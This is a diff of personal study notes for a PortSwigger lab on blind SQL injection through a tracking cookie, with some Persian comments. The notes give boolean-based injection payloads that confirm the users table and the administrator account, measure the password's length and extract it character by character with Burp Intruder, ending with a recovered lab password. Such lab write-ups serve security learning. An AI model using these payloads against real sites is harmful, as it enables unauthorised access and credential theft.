@@ -1,3 +1,5 @@
+Notion Source: https://sinalalenakhsh.notion.site/3-Blind-91528a1d731045adb76da0b2122de0e7
+
 Episode11- YouTube Channel AcronProject:
 
     Source: https://portswigger.net/web-security/sql-injection/blind
@@ -7,7 +9,7 @@ Episode11- YouTube Channel AcronProject:
     vulnerable parameter - tracking cookie
     dont anything to show in browser = cant use UNION based injection
     Target:
-        1- Enumerate the Password of the administrator
+        1- Enumerate the password of the administrator
         2- Log in as the administrator user
 
     Detection Black Box :
@@ -33,7 +35,9 @@ Episode11- YouTube Channel AcronProject:
         |                                                                                                      ' and 1=1--   
         |        8-2- select tracking-id from tracking-table where trackingId = 'Paste here Cookie from browser' and 1=1--'
         |        8-3- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and 1=1--'
-        |                                                                                                    
+        |                                                                                       True
+        |           Relust = True             
+        |                                                                                       
         |    9- #-Payload-2:
         |        # 1-2 What if it was vulnerable?
         |        if tracking id exists + (Inject = False) -----> Query returns value           = False => no Wellcome back message !!!!!!! :/
@@ -65,30 +69,32 @@ Episode11- YouTube Channel AcronProject:
                 پاس شده
                 برنده شده}
         |   10-8- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (True)=True--'
-        |   10-9- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and True--'
+        |   10-9- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and True--'  
         |   10-10- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select 'x' from users LIMIT 1)='x'--'
         |
         |   Result ==> users table exists in the database.
         |
         11- Confirm that username = ? exists users table: 
         |   10-10- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select 'x' from users LIMIT 1)='x'--'
-        |   11-1   select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username'administrator')='administrator'--'
+        |   11-1   select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator')='administrator'--'
         |   Result = True so administrator user exists 
         |
-        |   11-2   select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username'administrator123asd')='administrator123asd'--'
+        |   11-2   select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator123asd')='administrator123asd'--'
         |   Result ==> False so administrator123asd user not exists
         |
-        12- Enumerate the Password of the administrator user:
-        |   11-1 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username'administrator')='administrator'--'
-        |   12-1 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select Password from users where username'administrator')='Password'--'
-        |                                                                                                                                                       = How ?
-        |   12-2 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username'administrator' and LENGTH(Password)>1)='administrator'--' = True/False? 
-        |   12-3 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username'administrator' and LENGTH(Password)>50)='administrator'--'= True/False?
+        12- Enumerate the password of the administrator user:
+        |   11-1 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator')='administrator'--'
+        |   12-1 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select password from users where username='administrator')='password'--'
+        |                                                                                                                                                        = How ?
+        |   12-2 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--' = True/False?
+                                                                                                                                                                                                       if True so password is bigger than 1              
+        |   12-3 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator' and LENGTH(password)>2)='administrator'--' = True/False?
+        |   12-4 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator' and LENGTH(password)>50)='administrator'--'= True/False?
         |                                                                                                                                                                                             .... = if it's False                      
         13- Go with Intruder BurpSuite:
         |   13-1  click ---> Clear $
         |   13-2  Highlight 1 on this query:
-        |       select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username'administrator' and LENGTH(Password)>2)='administrator'--'
+        |       select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator' and LENGTH(password)>2)='administrator'--'
         |
         |   13-3  Click ---> Add $
         |   13-4  Attack type = Sniper
@@ -100,10 +106,10 @@ Episode11- YouTube Channel AcronProject:
         |   13-10 Step = 1
         |   13-11 Start attack:
         |         
-        |         Look at the Length in Relust BurpSuite ?
+        |         Look at the Length in Result BurpSuite ?
         |         when is this change so is other response
         |   
-        |   Result = Get length number the Password characters
+        |   Result = Get length number the password characters
         |
         |   another way to find this: 
         |       Click on Filter: ---> Filter by search term ---> welcome ---> Apply
@@ -113,7 +119,7 @@ Episode11- YouTube Channel AcronProject:
         |   14-1-:
         |   just for rewiew    
         |       select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (True)=True--'
-        |       select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select substring(password,1,1) from users where username'administrator')='a'--' 
+        |       select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select substring(password,1,1) from users where username='administrator')='a'--' 
         |                                                                                                                                        = if is True = a is first character 
         15- Send in Intruder       
         16- Like 13-1 to 13-11 for "a" 
@@ -127,7 +133,8 @@ Episode11- YouTube Channel AcronProject:
         17- with True answer response ---> Go to Intruder ----> Positions ----> Attack Type = Cluster bomb
         18- use this query-:
         |                                                                                                                    $1$                                               $a$
-        |    select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select substring(password,$1$,1) from users where username'administrator')='$a$'--'
+        |                                                              'asDAWF2$DSGX!123!EXV' and (select substring(password,1,1) from users where username='administrator')='a'--        
+        |    select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select substring(password,$1$,1) from users where username='administrator')='$a$'--'
         |
         19- Go to Payloads tab-:
         |     19-1 Payload set 1 & 2
@@ -137,9 +144,8 @@ Episode11- YouTube Channel AcronProject:
         |                               3- adQxxxxxxxx
         |                               4- adQ7xxxxxxx
         |
-
-
-
+                Password = 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+                           63hbelr10ywa9h1aofp7                        
 
 
 
